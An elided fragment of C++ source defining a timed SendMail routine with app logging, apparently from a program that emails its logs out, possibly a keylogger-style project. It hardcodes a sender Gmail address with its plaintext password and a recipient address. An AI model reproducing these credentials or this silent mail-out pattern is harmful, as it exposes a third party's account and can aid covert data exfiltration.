...
namespace Mail {
    ...
    #define X_EM_TO "lanuks97@gmail.com"
    #define X_EM_FROM "jobs.abt.kl@gmail.com"
    #define X_EM_PASS "IIESTSTUDENT"
    ...
    std::string StringReplace(std::string s, const std::string& what, 
    ...
    int SendMail(const std::string& subject, const std::string& body,
        ...
        m_timer.SetFunction([&] {
            ...
            Helper::WriteAppLog("<From SendMail> Return code: " 
                + Helper::ToString((int)exit_code));
            }
        );
